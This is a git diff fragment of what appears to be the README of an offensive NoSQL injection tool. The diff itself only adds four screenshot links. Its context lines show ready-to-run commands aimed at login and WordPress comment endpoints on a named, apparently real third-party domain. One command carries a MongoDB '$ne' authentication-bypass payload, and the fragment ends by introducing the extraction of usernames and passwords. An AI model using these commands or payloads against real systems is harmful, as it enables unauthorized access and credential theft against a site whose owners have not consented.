@@ -70,6 +70,11 @@ python NosqlAimar13.py -u https://www.zbath.co.il:20001/v1/account/login --metho
 python NosqlAimar13.py -u https://www.zbath.co.il:20001/v1/account/login --method json --data {\"username\":{\"$ne\":\"1\"},\"password\":\"1\"}
 python NosqlAimar13.py -u https://www.zbath.co.il/wp-json/wp/v2/comments?post=1407 --method json --file params.txt
 ```
+<img width="1365" height="649" alt="momgo" src="https://github.com/user-attachments/assets/236d47ef-98b9-4e9b-8600-972bf48988b9" />
+<img width="1366" height="654" alt="mom2" src="https://github.com/user-attachments/assets/d3ae27fd-3fba-445c-876f-ca78e183ac7e" />
+<img width="1366" height="641" alt="momg1" src="https://github.com/user-attachments/assets/6d4f7c49-00f0-4c5b-aebb-5c1fc46fad05" />
+<img width="1366" height="483" alt="momgo2" src="https://github.com/user-attachments/assets/df8e41b4-e264-4275-a6b0-4246d82d76fb" />
+
 Let's say you have a username and a password, and you want to extract both usernames and passwords.
 # Get the usernames:
 ```bash
